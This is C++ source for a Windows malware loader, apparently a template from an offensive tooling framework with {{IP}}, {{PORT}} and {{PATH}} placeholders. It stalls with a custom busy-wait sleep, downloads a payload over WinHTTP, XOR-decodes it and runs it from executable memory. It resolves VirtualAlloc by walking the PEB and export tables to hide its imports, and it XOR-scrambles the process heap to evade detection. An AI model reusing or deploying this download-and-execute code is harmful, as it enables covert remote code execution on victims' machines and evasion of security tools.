#include <windows.h> 
#include <winhttp.h> 
#include <stdio.h> 
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <winternl.h>
#include <fstream>

#pragma comment(linker,"/entry:WinMain")
#pragma comment(lib,"winhttp.lib") 
#pragma warning(disable:4996)

#define INTERVAL rand() % 26 
#define MS_PER_SECOND 1000 
#define SLEEPTIME INTERVAL*MS_PER_SECOND 

typedef LPVOID(WINAPI* pfnVirtualAlloc)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
typedef struct Params {LPVOID pBaseAddress;} PARAMS;
typedef VOID(*fprun)(PARAMS pParams);


HMODULE MyGetModuleHandle(IN LPCWSTR szModuleName);
PVOID MyGetProcAddress(HMODULE handle, LPCSTR Name);
void __alt_sleepms(size_t ms);
void XOR(char* data, int len, unsigned char key);

const char key[2] = "A";
size_t keySize = sizeof(key);

void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) {
    for (size_t i = 0; i < length; ++i) {
        buffer[i] ^= key[i % keyLength];
    }
}

PROCESS_HEAP_ENTRY entry;
void HeapEncryptDecrypt() {
    SecureZeroMemory(&entry, sizeof(entry));
    while (HeapWalk(GetProcessHeap(), &entry)) {
        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
            xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);
        }
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {

    unsigned int seed = 0;
    for (int i = 0; __TIME__[i] != '\0'; ++i) {
        if (__TIME__[i] >= '0' && __TIME__[i] <= '9') {
            seed = seed * 10 + (__TIME__[i] - '0');
        }
    }
    srand(seed);
    __alt_sleepms(SLEEPTIME * 12);

    LPCWSTR remotehost = L"{{IP}}"; 
    int remoteport = {{PORT}};
    LPCWSTR remotedir = L"{{PATH}}"; 
    unsigned char key = 0x7e; 

    HINTERNET hInternet;
    HINTERNET hHttpSession;
    HINTERNET hHttpConnection;
    HINTERNET hHttpRequest;
    DWORD dwSize;
    BOOL bResults;
    DWORD dwStatus;
    DWORD dwStatusSize;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    std::vector<unsigned char> PEbuffer;

    hInternet = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    hHttpSession = WinHttpConnect(hInternet, remotehost, remoteport, 0);
    hHttpRequest = WinHttpOpenRequest(hHttpSession, L"GET", remotedir, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    bResults = WinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    bResults = WinHttpReceiveResponse(hHttpRequest, NULL);

    do
    {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hHttpRequest, &dwSize))
        {
            printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
        }

        pszOutBuffer = new char[dwSize + 1];

        if (!pszOutBuffer) {
            dwSize = 0;
        }

        ZeroMemory(pszOutBuffer, dwSize + 1);

        if (!WinHttpReadData(hHttpRequest, (LPVOID)pszOutBuffer,
            dwSize, &dwDownloaded))
            printf("Error %u in WinHttpReadData.\n", GetLastError());
        else
            PEbuffer.insert(PEbuffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

    } while (dwSize > 0);


    unsigned char xor_key[] = { 0xbc, 0xab, 0xcb };
    size_t key_length = sizeof(xor_key);

    for (size_t i = 0; i < PEbuffer.size(); ++i) {
        PEbuffer[i] ^= xor_key[i % key_length];
    }

    char* PE = (char*)malloc(PEbuffer.size());
    for (int i = 0; i < PEbuffer.size(); i++) {
        PE[i] = PEbuffer[i] ^ 0x7e;
    }

    PARAMS pParams;
    pParams.pBaseAddress = (LPVOID)MyGetModuleHandle(NULL);

    pfnVirtualAlloc fnVirtualAlloc = (pfnVirtualAlloc)MyGetProcAddress(MyGetModuleHandle(L"kernel32.dll"), "VirtualAlloc");
    LPVOID pBuffer = fnVirtualAlloc(NULL, PEbuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (NULL == pBuffer) {
        printf("VirtualAlloc failed\n");
        exit(1);
    }

    XOR(PE, PEbuffer.size(), key); 
    memcpy(pBuffer, PE, PEbuffer.size());
    HeapEncryptDecrypt();
    HeapEncryptDecrypt();

    fprun Run = (fprun)pBuffer;
    Run(pParams);

    WinHttpCloseHandle(hHttpRequest);
    WinHttpCloseHandle(hHttpSession);
    WinHttpCloseHandle(hInternet);

    free(PE);
    return 0;
}



BOOL StringEq(IN LPCWSTR s1, IN LPCWSTR s2) {

    WCHAR  lStr1[MAX_PATH],
        lStr2[MAX_PATH];

    int    len1 = lstrlenW(s1),
        len2 = lstrlenW(s2);

    int    i = 0,
        j = 0;

    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;

    for (i = 0; i < len1; i++) {
        lStr1[i] = (WCHAR)tolower(s1[i]);
    }
    lStr1[i++] = L'\0';


    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(s2[j]);
    }
    lStr2[j++] = L'\0';


    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;

    return FALSE;

}

HMODULE MyGetModuleHandle(IN LPCWSTR szModuleName) {

#ifdef _WIN64 
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    while (pDte) {
        if (pDte->FullDllName.Length != 0) {
            if (StringEq(pDte->FullDllName.Buffer, szModuleName)) {

#ifdef STRUCTS
                return (HMODULE)(pDte->InMemoryOrderLinks.Flink);
#else
                return (HMODULE)(pDte->Reserved2[0]);
#endif

            }
        }
        else {
            break;
        }
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;

}


PVOID MyGetProcAddress(HMODULE handle, LPCSTR Name) {
    PBYTE pBase = (PBYTE)handle;
    PIMAGE_DOS_HEADER pdosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (pdosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pdosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    IMAGE_OPTIONAL_HEADER peOptionHeader = pImageNtHeaders->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pExportVirtualAddress = (PIMAGE_EXPORT_DIRECTORY)(pBase + peOptionHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pExportVirtualAddress->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pExportVirtualAddress->AddressOfFunctions);
    PWORD ordinArray = (PWORD)(pBase + pExportVirtualAddress->AddressOfNameOrdinals);


    for (DWORD i = 0; i < pExportVirtualAddress->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID functionAddress = (PVOID)(pBase + FunctionAddressArray[ordinArray[i]]);

        if (strcmp(Name, pFunctionName) == 0) {
            return functionAddress;
        }
    }
    return nullptr;
}


typedef NTSTATUS(WINAPI* pSystemFunction032)(PVOID, PVOID);

unsigned long long __get_timestamp()
{
    const size_t UNIX_TIME_START = 0x019DB1DED53E8000;
    const size_t TICKS_PER_MILLISECOND = 1000;
    LARGE_INTEGER time;
    time.LowPart = *(DWORD*)(0x7FFE0000 + 0x14);
    time.HighPart = *(long*)(0x7FFE0000 + 0x1c);
    return (unsigned long long)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
}

void __alt_sleepms(size_t ms)
{
    volatile size_t x = rand();
    const unsigned long long end = __get_timestamp() + ms;
    while (__get_timestamp() < end) { x += 1; }
    if (__get_timestamp() - end > 2000) return;

}

void XOR(char* data, int len, unsigned char key) {
    int i;
    for (i = 0; i < len; i++)
        data[i] ^= key;
}